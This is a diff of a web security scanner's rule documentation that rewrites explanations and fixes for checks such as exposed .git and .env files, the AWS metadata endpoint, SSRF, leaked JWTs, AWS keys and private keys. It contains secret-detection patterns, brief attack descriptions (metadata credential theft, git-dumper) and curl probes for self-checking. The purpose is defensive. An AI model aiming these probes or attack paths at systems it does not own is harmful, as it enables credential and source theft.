+**Why it matters:** The autocomplete attribute tells browsers what a field holds. Card fields have their own tokens: cc-number, cc-exp, cc-csc and cc-name. Password fields are covered by a separate check, page-password-field-autocomplete-wrong.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete
 
 **Fix:**
-- Add autocomplete="new-password" for registration fields.
-- Add autocomplete="current-password" for login fields.
-- Add appropriate autocomplete values for payment fields.
-- **Proper autocomplete** (html):
+- Add autocomplete="cc-number" to the card number field.
+- Add autocomplete="cc-exp" and autocomplete="cc-csc" to the expiry and security code fields.
+- Add autocomplete="cc-name" to the cardholder name field.
+- **Card field tokens** (html):
 ```html
-<input type="password" autocomplete="current-password" />
-<input type="password" autocomplete="new-password" />
+<input name="cardnumber" autocomplete="cc-number" inputmode="numeric" />
+<input name="exp" autocomplete="cc-exp" />
+<input name="cvc" autocomplete="cc-csc" inputmode="numeric" />
 ```
 
 ### `form-target-blank` [content / low / body-pattern]
@@ -7310,7 +7328,7 @@ The page uses a <base> tag with an HTTP URL, making all relative URLs resolve in
 
 **Risk:** All relative links, scripts, images resolve against the insecure base URL.
 
-**Why it matters:** The HTML <base> tag sets the base URL for all relative URLs in the document.
+**Why it matters:** The base URL applies to every relative URL on the page, and only an HTTPS page with an http:// <base> href reaches this finding. Browsers block most scripts and stylesheets resolved this way as mixed content, which usually shows up as a broken page, while forms and links still go over HTTP. An attacker on the network can then read form data and rewrite what comes back.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base
@@ -7350,11 +7368,11 @@ References to potentially sensitive endpoints in the page source.
 ### `dangerous-html-attrs` [content / high / body-pattern]
 **Dangerous HTML Attributes Detected**
 
-Potentially dangerous HTML attributes like inline event handlers, javascript: URIs.
+Inline event handlers whose code calls eval, document.write, fetch, XMLHttpRequest or alert, or assigns to location or innerHTML.
 
 **Risk:** Inline event handlers and javascript: URIs are common XSS vectors.
 
-**Why it matters:** Inline event handlers, javascript: protocol links, and data: URIs embedding HTML/JS are all classic XSS injection points.
+**Why it matters:** An on* attribute is script with no script tag, and these do something powerful: navigate, write HTML or make a network request. If any part of the value comes from user data, an escaping mistake becomes code execution, because attribute contents are HTML-decoded before they run. A strict CSP blocks inline handlers entirely, so moving them to addEventListener is also what makes that CSP possible. alert( in a handler is worth a look by itself, since injected test payloads use it.
 
 **References:**
 - https://owasp.org/www-community/attacks/xss/
@@ -7379,7 +7397,7 @@ A JSON Web Token was found embedded in a URL within the page HTML.
 
 **Risk:** The token appears in browser history, proxy logs, server logs, and Referer headers.
 
-**Why it matters:** JWTs in URLs persist in numerous locations, creating many avenues for token theft.
+**Why it matters:** A JWT is a bearer credential and works until it expires for whoever has it. In a query string it is copied to browser history, to web server and CDN access logs, and to the Referer header sent to third-party scripts and linked sites. Unlike a session ID, a JWT usually cannot be revoked, so those copies stay valid. Decode the middle segment, which is plain base64url, to see its exp claim and what it grants.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/598.html
@@ -7400,23 +7418,27 @@ fetch('/api/data', { headers: { 'Authorization': 'Bearer ' + token } });
 ### `sensitive-meta-tags` [content / low / body-pattern]
 **Sensitive Information in Meta Tags**
 
-Meta tags that expose sensitive or unnecessary information.
+A meta tag's name contains token, api-key, secret, session or internal.
 
-**Risk:** Meta tag contents are visible in page source.
+**Risk:** Meta tag contents are visible in page source and to every script on the page, so a real credential here is exposed to every visitor.
 
-**Why it matters:** Generator tags reveal exact software versions with known CVEs. CSRF tokens in meta tags are accessible to any script.
+**Why it matters:** A value here only matters if it grants something, such as an api-secret holding a live key. A CSRF token in a meta tag is the documented Laravel and Rails pattern and is not a leak: it is tied to the visitor's own session, and any same-origin script could read a hidden input just as easily.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/200.html
 - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 
 **Fix:**
-- Remove generator meta tags in production.
-- Move CSRF tokens to HTTP-only cookies.
-- Never store API keys in meta tags.
-- **WordPress** (php):
-```php
-remove_action('wp_head', 'wp_generator');
+- Remove credential values from meta tags and keep them on the server.
+- If the browser needs to call a service, proxy the call through your backend or issue a short-lived token.
+- Leave CSRF tokens where your framework puts them.
+- **Keep credentials out of meta tags** (html):
+```html
+<!-- BAD: every visitor receives this key -->
+<meta name="api-secret" content="sk_live_...">
+
+<!-- FINE: tied to this visitor's session -->
+<meta name="csrf-token" content="{{ csrf_token() }}">
 ```
 
 ### `opengraph-injection` [content / medium / body-pattern]
@@ -7491,11 +7513,11 @@ JavaScript accesses window.opener properties, exploitable for reverse tabnabbing
 ### `weak-crypto` [content / high / body-pattern]
 **Deprecated Cipher or Hash Algorithm in Page Code**
 
-Weak or broken cryptographic algorithms in client-side JavaScript.
+Code in the page calls MD5 or SHA-1, or uses DES, RC2, RC4, Blowfish or ECB mode.
 
 **Risk:** Weak cryptography provides a false sense of security. MD5/SHA-1 can be forged, DES/RC4 broken, Math.random() is predictable.
 
-**Why it matters:** Cryptographic algorithms become weak as computing power increases. MD5 collisions can be generated in seconds.
+**Why it matters:** What matters is what the algorithm is used for. MD5 or SHA-1 as a cache key or checksum harms nobody, while MD5 over a password is a real break, and practical collisions exist for both hashes. DES has a 56-bit key that modern hardware exhausts quickly, and ECB leaks patterns because identical blocks encrypt identically. Encryption done in client code is suspect anyway, since the key ships to the user.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html
@@ -7568,11 +7590,11 @@ const parser = new xml2js.Parser({ strict: true, normalize: true, xmlns: false }
 ### `ssrf-vectors` [content / high / body-pattern]
 **Potential Server-Side Request Forgery (SSRF) Vectors**
 
-User-controlled input may be used in server-side HTTP requests.
+Server-style code in the response passes a request object straight to an HTTP client (req. or request. inside fetch, axios, requests or urllib).
 
 **Risk:** SSRF allows attackers to access internal resources, cloud metadata services, or internal networks.
 
-**Why it matters:** SSRF occurs when an application fetches a remote resource without validating the user-supplied URL.
+**Why it matters:** If that code runs on the server, a user can aim the request at http://169.254.169.254/ and collect cloud credentials, or reach databases and admin panels bound to localhost. Seeing it in a response also suggests source is being served to the public. Trace the argument back to confirm that it is user input, and validate the resolved IP rather than the hostname.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
@@ -7810,18 +7832,20 @@ export default {
 ### `aws-metadata-reference` [content / critical / body-pattern]
 **AWS Metadata Endpoint Reference**
 
-Reference to AWS metadata endpoint (169.254.169.254) detected.
+The response contains the link-local metadata address 169.254.169.254, or a latest/meta-data or /metadata/instance path.
 
-**Risk:** SSRF to metadata endpoint can steal IAM credentials.
+**Risk:** From inside a cloud instance, that address returns temporary credentials for the instance's role. A server-side request forgery bug pointed at it turns a URL parameter into access to the cloud account.
 
-**Why it matters:** The AWS metadata service provides instance credentials.
+**Why it matters:** A mention in a page is not itself a breach, but application code has no reason to show it to visitors, so look at what put it there: a leaked config, a debug dump, an error from a failed internal request, or a submitted URL reflected back. To check your exposure, run curl http://169.254.169.254/latest/meta-data/ on the instance. With IMDSv2 required it answers 401 without a session token, which stops most SSRF because the attacker cannot send the PUT request and header.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/918.html
 - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
 
 **Fix:**
-- Block metadata access from applications; use IMDSv2.
+- Require IMDSv2 on every instance (HttpTokens=required) and set the hop limit to 1.
+- Block 169.254.169.254 in the application's outbound HTTP client, and at the network layer if the app does not need it.
+- Find out why the address appears in this response and remove it.
 - **Block access to AWS metadata endpoint** (typescript):
 ```typescript
 // Ensure no user-controlled URLs can reach 169.254.169.254
@@ -7841,11 +7865,11 @@ async function safeFetch(url: string) {
 ### `git-directory-exposed` [content / high / body-pattern]
 **.git Directory Paths Exposed**
 
-.git directory paths found in page source.
+A link or asset on the page points into a .git directory: /.git/HEAD, config, objects or refs.
 
-**Risk:** Exposed .git allows downloading entire source code history.
+**Risk:** A readable .git directory is the whole repository. Tools such as git-dumper rebuild it from the object files, which gives an attacker your source code, every past commit, and anything that was ever committed and later deleted, including API keys and database passwords.
 
-**Why it matters:** If .git is accessible, attackers can reconstruct your entire repository.
+**Why it matters:** This check reads the page's links, so it shows that something references .git, not that the directory is served. To confirm, run curl -si https://your-site/.git/HEAD. A 200 whose body starts with ref: refs/heads/ means it is exposed, and a 403 or 404 means the rule is working. Directory listing does not have to be on, because object names can be found by following refs from known paths. It usually happens when a site is deployed with git clone or git pull into the web root.
 
 **References:**
 - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/
@@ -7853,29 +7877,41 @@ async function safeFetch(url: string) {
 - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 
 **Fix:**
-- Block access to .git directory in web server config.
-- **Block access to .git directory** (nginx):
+- Deny .git at the web server: the Nginx, Apache and Caddy rules are below.
+- On a static host (Netlify, Vercel, GitHub Pages, Cloudflare Pages, an S3 bucket) there is no server block to add a rule to: publish only the build output directory and keep dotfiles out of it, then request the path to confirm a 404.
+- Deploy build output rather than a checkout, so no .git directory exists in the web root.
+- If the directory was reachable, rotate every secret that has ever been in the repository's history, not just the current ones.
+- **Nginx** (nginx):
 ```nginx
 # Block .git and other VCS directories
 location ~ /\.git {
   deny all;
   return 404;
 }
+```
+- **Apache (vhost or .htaccess)** (apache):
+```apache
+RedirectMatch 404 /\.git(/|$)
+```
+- **Caddy** (caddy):
+```caddy
+example.com {
+  @git path */.git */.git/*
+  respond @git 404
 
-# Apache:
-# <DirectoryMatch "^\.git">
-#   Require all denied
-# </DirectoryMatch>
+  root * /var/www/site
+  file_server
+}
 ```
 
 ### `env-file-reference` [content / critical / body-pattern]
 **.env File Reference Detected**
 
-References to .env file found in page source.
+A link or asset on the page points at a .env file (.env, .env.local, .env.production and similar).
 
-**Risk:** Exposed .env files contain database credentials, API keys, and secrets.
+**Risk:** A .env file is normally the complete list of an app's secrets: database URL, API keys, mail credentials, the session signing key. One GET returns all of them in plain text, and automated scanners request /.env on every host they find.
 
-**Why it matters:** .env files should never be web-accessible.
+**Why it matters:** The check reads links in the page, so it proves the reference exists, not that the file is served. Confirm with curl -si https://your-site/.env and read the body: a list of KEY=value lines is a leak, while a 200 that returns your normal HTML is a single-page app's catch-all and harmless. Frameworks do not protect you if a copy of the project sits in a web root. If the file was served, every value in it is burned.
 
 **References:**
 - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/
@@ -7883,28 +7919,41 @@ References to .env file found in page source.
 - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 
 **Fix:**
-- Block .env access in web server config.
-- **Block access to .env files via web server** (nginx):
+- Deny .env at the web server: the Nginx, Apache and Caddy rules are below.
+- On a static host (Netlify, Vercel, GitHub Pages, Cloudflare Pages, an S3 bucket) there is no server block to add a rule to: publish only the build output directory and keep dotfiles out of it, then request the path to confirm a 404.
+- Keep .env files outside the web root, and inject values through the host's environment settings or a secrets manager.
+- If the file was reachable, rotate every value in it, starting with database credentials and signing keys.
+- **Nginx** (nginx):
 ```nginx
 # Block .env and related files from being served
 location ~* /\.env {
   deny all;
   return 404;
 }
+```
+- **Apache (vhost or .htaccess)** (apache):
+```apache
+RedirectMatch 404 /\.env(\.[a-z]+)?$
+```
+- **Caddy** (caddy):
+```caddy
+example.com {
+  @dotenv path */.env */.env.*
+  respond @dotenv 404
 
-# Store .env files outside the web root
-# In Next.js: .env.local is never served, but verify your web server config
-# For Docker: use ARG/ENV in Dockerfile or a secrets manager, not .env files
+  root * /var/www/site
+  file_server
+}
 ```
 
 ### `phpinfo-exposed` [content / critical / body-pattern]
 **phpinfo() Page Exposed**
 
-phpinfo() page or reference detected.
+The page is a phpinfo() report, or it links to a phpinfo.php file.
 
-**Risk:** phpinfo() exposes complete server configuration, PHP settings, and environment variables.
+**Risk:** phpinfo() prints the PHP version and loaded modules, filesystem paths, every php.ini setting and all environment variables, which on many hosts include database passwords and API keys. It also shows the session and upload settings that make other attacks easier to plan.
 
-**Why it matters:** This diagnostic page should never be accessible in production.
+**Why it matters:** The report echoes the HTTP request as well, cookies included, so a phpinfo page defeats HttpOnly: XSS elsewhere on the site can fetch it and read the session cookie out of the output. To confirm, open the URL and read the Environment and PHP Variables tables for credentials. These files are normally left over from debugging a server setup, under names like info.php, phpinfo.php or test.php.
 
 **References:**
 - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/
@@ -7912,8 +7961,10 @@ phpinfo() page or reference detected.
 - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 
 **Fix:**
-- Remove phpinfo() files from production.
-- Block access in web server config.
+- Delete the file, and search the web root for other files that call phpinfo().
+- Rotate any credential shown in the Environment or PHP Variables tables.
+- Add phpinfo to disable_functions in the production php.ini so a forgotten file prints nothing.
+- Block the common filenames in the web server if the files cannot be deleted right away.
 - **Remove phpinfo() from production servers** (php):
 ```php
 <?php
@@ -7999,19 +8050,21 @@ app.use("/api-docs", requireAdminAuth, swaggerUi.serve, swaggerUi.setup(spec));
 ### `spring-boot-actuator` [content / high / body-pattern]
 **Spring Boot Actuator Endpoints Exposed**
 
-Spring Boot Actuator endpoints found in page source.
+The page references a Spring Boot Actuator endpoint under /actuator: health, env, info, beans or mappings.
 
-**Risk:** Actuator endpoints expose env vars, beans, mappings, and health status.
+**Risk:** /actuator/env lists configuration properties, /actuator/heapdump (when enabled) downloads the JVM's memory with live secrets and session tokens, and /actuator/mappings lists every route in the app. A writable env endpoint combined with certain libraries has been used for remote code execution.
 
-**Why it matters:** Spring Boot Actuator provides operational endpoints that should be secured.
+**Why it matters:** This finding means the path appears in the response. It does not prove the endpoints answer, and a public /actuator/health on its own is common and low risk. Confirm with curl -si https://your-site/actuator, which lists the exposed endpoints as JSON links when Actuator is reachable, then try env and heapdump specifically. Current Spring Boot versions expose only health over HTTP by default, so a wider list comes from a management.endpoints.web.exposure.include setting someone changed, often to *.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/200.html
 - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 
 **Fix:**
-- Restrict actuator endpoints to internal access only.
-- Use Spring Security to protect actuator.
+- Set management.endpoints.web.exposure.include to health only.
+- Move management to a separate internal port with management.server.port.
+- Protect anything else with Spring Security and a role that only operators hold.
+- If env or heapdump were reachable, rotate the credentials they could have shown.
 - **Restrict Spring Boot Actuator endpoints** (yaml):
 ```yaml
 # application.yml: expose only health endpoint publicly
@@ -8086,11 +8139,11 @@ window.addEventListener("message", (e) => {
 ### `postmessage-star-origin` [content / high / body-pattern]
 **postMessage() With Wildcard Origin**
 
-postMessage called with * origin target.
+postMessage is called with * as its target origin.
 
-**Risk:** Sensitive data sent to any listening window.
+**Risk:** Whatever window is at the other end receives the message, even if it has navigated to an attacker's page. Tokens, user details or form contents posted this way can be read by that page.
 
-**Why it matters:** Using * as target origin means any page can receive the message.
+**Why it matters:** The target origin argument is the only check on who receives the message. With *, a popup or iframe your page opened can be navigated by someone else and the data still arrives. It is harmless for a resize event, so read the message body first. OAuth popups that post tokens back to the opener are the classic bad case. Check the receiving side as well: a listener that does not test event.origin is the matching bug.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns
@@ -8098,7 +8151,9 @@ postMessage called with * origin target.
 - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 
 **Fix:**
-- Specify the exact target origin instead of *.
+- Pass the exact origin of the receiving window, such as https://app.example.com.
+- Never post tokens or personal data with * as the target.
+- On the receiving side, check event.origin before trusting event.data.
 - **Replace "*" targetOrigin with explicit origin** (typescript):
 ```typescript
 // BAD: "*" sends to any origin
@@ -8119,16 +8174,18 @@ window.addEventListener("message", (e) => {
 
 JSON Web Token found in HTML source.
 
-**Risk:** Exposed tokens allow session hijacking.
+**Risk:** Anyone who reads the page source, and any script on the page, can send this token and be treated as its subject until it expires.
 
-**Why it matters:** JWTs in page source can be stolen by XSS attacks.
+**Why it matters:** Detected by three base64url segments where the first two begin with eyJ, the encoding of an opening brace and quote. Decode the middle part to find out what it is. A token with a sub claim and a future exp in a cached page is a session someone else can use. The signature only protects integrity: the payload is readable, so it also leaks whatever claims it holds.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/598.html
 - https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
 
 **Fix:**
-- Never embed JWTs in HTML; use HttpOnly cookies.
+- Never embed session JWTs in HTML. Use HttpOnly cookies.
+- If script needs a token, fetch a short-lived one after page load and hold it in memory.
+- Mark pages that carry per-user data as private so that CDNs do not cache them.
 - **Remove JWTs from HTML: use HttpOnly cookies** (typescript):
 ```typescript
 // JWTs embedded in HTML are visible in source view and accessible to XSS
@@ -8144,11 +8201,11 @@ res.setHeader("Set-Cookie",
 ### `base64-credentials` [content / high / body-pattern]
 **Base64 Credentials in Page Source**
 
-Basic authentication credentials (Base64) found.
+An Authorization or Proxy-Authorization header with Basic credentials appears in the page source.
 
 **Risk:** Base64 credentials are trivially decodable.
 
-**Why it matters:** Basic auth headers encode credentials in Base64 which is not encryption.
+**Why it matters:** Base64 is an encoding: run echo VALUE | base64 -d and you have the username and password. In page source this usually belongs to an API call in front-end code or a copied curl command, so every visitor gets the login. Basic credentials have no expiry and keep working until the password changes. Decode it to see which account it is, and change that password first.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -8156,8 +8213,9 @@ Basic authentication credentials (Base64) found.
 - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
 
 **Fix:**
-- Remove hardcoded credentials from page source.
-- Use token-based authentication.
+- Change the password for the account the header decodes to.
+- Remove the credentials from page source and make the call from your backend.
+- Use token-based authentication with an expiry instead of Basic credentials.
 - **Remove base64-encoded credentials from source** (typescript):
 ```typescript
 // Base64 is encoding, not encryption, trivially decoded:
@@ -8239,14 +8297,16 @@ Form with password field uses GET method.
 
 **Risk:** Credentials appear in URL, browser history, and server logs.
 
-**Why it matters:** GET requests encode form data in the URL query string.
+**Why it matters:** A GET form puts each field in the query string, so the password lands in browser history, in server and proxy access logs, and in the Referer header of any request the next page makes. Address-bar suggestions can then offer it to the next person on that computer. A form with no method attribute defaults to GET, which is how this usually happens by accident.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/598.html
 - https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
 
 **Fix:**
-- Change form method to POST for all forms with sensitive data.
+- Set method="post" on every form with a password or other sensitive field.
+- Check that the server rejects credentials sent in a query string.
+- Remove logged URLs containing passwords, and ask affected users to change them.
 - **Use POST for forms that handle sensitive data** (html):
 ```html
 <!-- BAD: GET puts form data in the URL (logged, cached, shared) -->
@@ -8325,7 +8385,7 @@ Password parameter found in URL.
 
 **Risk:** Credentials exposed in browser history, server logs, referrer.
 
-**Why it matters:** GET parameters appear in URL and are logged everywhere.
+**Why it matters:** Password parameters in URLs outlive the request: access logs, analytics tools, browser history, link previews in chat and the Referer header all capture them. If this came from a link in a page, everyone who loaded it received that password. Look through your logs for how long the pattern has been in use, since every value logged is a password someone may also use elsewhere.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -8333,7 +8393,9 @@ Password parameter found in URL.
 - https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
 
 **Fix:**
-- Use POST for all forms with passwords.
+- Use POST for all forms with passwords, and send API credentials in a header.
+- Make the server reject requests with a password in the query string.
+- Purge or restrict the logs that captured these URLs, and force a reset for affected accounts.
 - **Use POST for password submission, never GET** (html):
 ```html
 <!-- BAD: password in GET request URL appears in server logs and history -->
@@ -8414,18 +8476,21 @@ res.setHeader("Set-Cookie",
 ### `oauth-state-missing` [content / high / body-pattern]
 **OAuth URL Missing State Parameter**
 
-OAuth authorization URL without state parameter.
+An OAuth authorization URL in the page has client_id or response_type but no state parameter.
 
-**Risk:** Vulnerable to CSRF attacks on OAuth flow.
+**Risk:** Without state, an attacker can make a victim's browser finish an OAuth flow the attacker started, linking the attacker's account to the victim's session. The attacker can then sign in as them, or the victim's data gets saved to the attacker's account.
 
-**Why it matters:** State parameter prevents cross-site request forgery in OAuth.
+**Why it matters:** state is a random value bound to the user's session. The app stores it before redirecting to the provider and rejects the callback unless the same value returns, which proves this browser started this login. PKCE gives similar protection for the code exchange, so check whether code_challenge is also missing before ranking this. To confirm the bug, complete a login with the state removed from the callback URL: if it still works, the value is not being enforced.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/352.html
 - https://owasp.org/Top10/A01_2021-Broken_Access_Control/
 
 **Fix:**
-- Always include a cryptographically random state parameter.
+- Generate at least 128 random bits for each login attempt and store them in the server session or a signed HttpOnly cookie.
+- Send the value as state on the authorization URL and reject any callback where it does not match.
+- Use each value once and then delete it.
+- Add PKCE with S256 as well.
 - **Always use and validate OAuth state parameter** (typescript):
 ```typescript
 import { randomBytes } from "crypto";
@@ -8549,20 +8614,20 @@ export async function POST(req: Request) {
 }
 ```
 
-### `cdn-fallback-missing` [content / low / body-pattern]
+### `cdn-fallback-missing` [content / info / body-pattern]
 **CDN Scripts Without Fallback**
 
-CDN-hosted scripts without local fallback.
+A script from a public CDN has no local fallback if the CDN fails to load it.
 
-**Risk:** Site breaks if CDN is unavailable or compromised.
+**Risk:** If the CDN is down or blocked for a visitor, the script does not load and features that depend on it stop working. This is about availability: Subresource Integrity is what protects against a compromised CDN.
 
-**Why it matters:** SRI helps but local fallback ensures availability.
+**Why it matters:** A fallback is an availability preference, and many sites reasonably go without one. It is worth adding when a CDN script is required for the page to work at all.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script
 
 **Fix:**
-- Add onerror fallback to local copy for critical scripts.
+- For scripts the page cannot work without, test for the library after the tag and load a local copy if it is missing, or self-host the file.
 - **Add SRI and a local fallback for CDN resources** (html):
 ```html
 <script
@@ -8611,7 +8676,7 @@ End-of-life AngularJS framework detected.
 
 **Risk:** No longer receives security updates.
 
-**Why it matters:** AngularJS reached EOL Dec 2021, migrate to Angular.
+**Why it matters:** AngularJS reached end of life on 31 December 2021 and gets no more patches from Google, so anything found since then stays open unless you pay for third-party long-term support. Its expression sandbox was removed in 1.6 because it could always be escaped, so user input reaching a template is script execution. The migration is a rewrite rather than an upgrade, since Angular 2 and later is a different framework.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/1104.html
@@ -8747,14 +8812,16 @@ Social Security Number pattern in content.
 
 **Risk:** Severe privacy violation, identity theft risk.
 
-**Why it matters:** SSNs should never appear in page content.
+**Why it matters:** The check fires on three or more values shaped like NNN-NN-NNNN outside code samples. Phone extensions, part numbers and test data can have this shape, so read the values before escalating. If they are real, this is a reportable breach in many US states, with notification duties that begin when you learn of it. Involve whoever owns privacy or legal right away.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/200.html
 - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 
 **Fix:**
-- Mask SSNs, never display in full.
+- Confirm whether the values are real Social Security Numbers.
+- Take the page down rather than editing it in place, then purge CDN caches and request removal from search engines.
+- Show at most the last four digits, and check who is authorized to see the record.
 - **Encrypt SSNs at rest and in transit** (typescript):
 ```typescript
 // SSNs are PII, never log, expose in APIs, or store unencrypted
@@ -8805,9 +8872,9 @@ return Response.json({
 
 Bearer token found in page source.
 
-**Risk:** Direct credential exposure.
+**Risk:** Anyone who reads the page can call the API as the token's owner, with its full scope, until it expires or is revoked.
 
-**Why it matters:** Bearer tokens grant API access.
+**Why it matters:** A bearer token needs no key or proof of possession: whoever presents it is the holder, which is what the name means. In source it normally arrives through a hardcoded fetch header or a config object rendered on the server, and it also appears when a request is echoed into a debug page. Find which API it belongs to, check its expiry and scopes, and revoke it there.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -8815,7 +8882,9 @@ Bearer token found in page source.
 - https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
 
 **Fix:**
-- Never embed tokens in HTML, use secure storage.
+- Revoke the token at the API that issued it.
+- Remove it from the page, and make the call from your backend.
+- If script must hold a token, fetch a short-lived one after load and keep it in memory.
 - **Remove bearer tokens from HTML and client-visible locations** (typescript):
 ```typescript
 // Bearer tokens embedded in HTML or JS bundles are readable by any script
@@ -8834,7 +8903,7 @@ API key found in URL parameter.
 
 **Risk:** Key leaked in referrer, history, logs.
 
-**Why it matters:** API keys in URLs are exposed in many places.
+**Why it matters:** A query string is the least private part of a request. Over HTTPS it is encrypted on the wire but stored in plain text at both ends: browser history, server and CDN logs, analytics, and the Referer header on outgoing links. Some APIs require this, Google Maps being the best known, and for those the key must be restricted by referrer or IP. This finding comes from the URL you scanned, so check where that URL came from.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -8842,7 +8911,9 @@ API key found in URL parameter.
 - https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
 
 **Fix:**
-- Pass API keys in headers instead of URLs.
+- Send the key in a header such as Authorization or X-API-Key.
+- Rotate any key that has appeared in a URL, because logs keep it.
+- If the provider requires a key in the URL, restrict it by referrer or IP address.
 - **Move API keys out of URLs into request headers** (typescript):
 ```typescript
 // BAD: API key in URL, logged by servers, proxies, and browser history
@@ -8861,11 +8932,11 @@ fetch("https://api.example.com/data", {
 ### `aws-credentials-exposed` [content / critical / body-pattern]
 **AWS Credentials Pattern Detected**
 
-AWS access key pattern found in source.
+The response contains an AWS access key ID (AKIA followed by 16 characters) or an aws_secret_access_key assignment with a 40-character value. AWS's published example keys are ignored.
 
-**Risk:** Full AWS account compromise possible.
+**Risk:** Anyone who reads this response holds the credential, and AWS keys work from anywhere unless a policy restricts them. The attacker gets what the IAM user could do: read S3 buckets, start instances for crypto mining, create a new IAM user as a back door. The bill and any data loss land on your account.
 
-**Why it matters:** AWS keys grant access to cloud resources.
+**Why it matters:** The ID alone cannot sign a request, so look for the 40-character secret near it or elsewhere in the bundle, and treat the pair as burned if it is there. Attackers find these by crawling, and their usual next call is aws sts get-caller-identity, which shows whose key it is. To check without using the key, look it up in IAM by its ID, read Last used, and search CloudTrail for its events from addresses you do not recognize. Keys reach responses through bundled .env values, NEXT_PUBLIC_ or VITE_ variables, and source maps.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -8873,7 +8944,10 @@ AWS access key pattern found in source.
 - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
 
 **Fix:**
-- Rotate exposed credentials immediately.
+- Deactivate the key in IAM now, before you look for how it leaked, then create a replacement if the workload still needs one.
+- Search CloudTrail for every event made with that access key ID, including any users, roles or keys it created, and remove those.
+- Remove the value from source, build output and git history, and rebuild so old bundles stop being served.
+- Move the workload to an IAM role or OIDC federation so no long-lived key exists to leak.
 - **Rotate exposed AWS credentials immediately** (bash):
 ```bash
 # 1. Deactivate the exposed key
@@ -8891,11 +8965,11 @@ aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,Attrib
 ### `private-key-exposed` [content / critical / body-pattern]
 **Private Key Detected in Source**
 
-Private key pattern found in page.
+The response contains a PEM block whose header reads BEGIN PRIVATE KEY, or the RSA, EC, DSA or OPENSSH form of it. Public keys and certificates do not match.
 
-**Risk:** Complete compromise of encrypted data.
+**Risk:** A private key cannot be changed the way a password can: everything that trusted it has to be replaced. Depending on what it belongs to, the holder can impersonate your server in a TLS handshake, sign JWTs your API accepts, log in over SSH, or decrypt files and traffic encrypted to it.
 
-**Why it matters:** Private keys should never be in HTML.
+**Why it matters:** The first question is what the key is for, because the cleanup differs. Compare its public half with your certificate (openssl pkey -pubout against openssl x509 -noout -pubkey), your JWKS or your authorized_keys files. If old TLS traffic was recorded on connections without forward secrecy, it can be decrypted as well. These blocks usually reach a page from a config file under the web root, a debug dump, or a bundle that inlined a signing key. A sample key from a tutorial matches too, so check whether this one is yours.
 
 **References:**
 - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/
@@ -8903,7 +8977,10 @@ Private key pattern found in page.
 - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
 
 **Fix:**
-- Rotate keys, investigate how they were exposed.
+- Work out what the key is used for: TLS certificate, JWT signing, SSH, PGP or a service account.
+- Generate a new key pair and replace every place that trusted the old one. Do not reuse the old key with a new certificate.
+- For TLS, ask the CA to revoke the certificate. For JWT signing, rotate the key and invalidate issued tokens. For SSH, remove the public half from every authorized_keys file.
+- Remove the key from the web root, the build and git history, and keep the new one in a KMS or secrets manager.
 - **Revoke and replace exposed private keys** (bash):
 ```bash
 # For TLS certificates: contact your CA to revoke the cert immediately
@@ -8981,9 +9058,9 @@ A Twilio Account SID pattern was found in the page. The Account SID functions li
 
 SendGrid API key pattern found.
 
-**Risk:** Email sending abuse, phishing.
+**Risk:** A key with Mail Send permission lets someone send email from your verified domains. SendGrid may then suspend the account for spam, which stops your legitimate mail too.
 
-**Why it matters:** SendGrid keys allow email sending.
+**Why it matters:** SendGrid keys start with SG. and have a fixed shape, so scrapers find them quickly. Mail sent this way passes your SPF and DKIM, which makes phishing far more convincing than ordinary spoofing. Check the Activity feed for sends you do not recognize, and look at which permissions the key had before deciding how far the exposure goes.
 
 **References:**
 - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/
@@ -8991,7 +9068,9 @@ SendGrid API key pattern found.
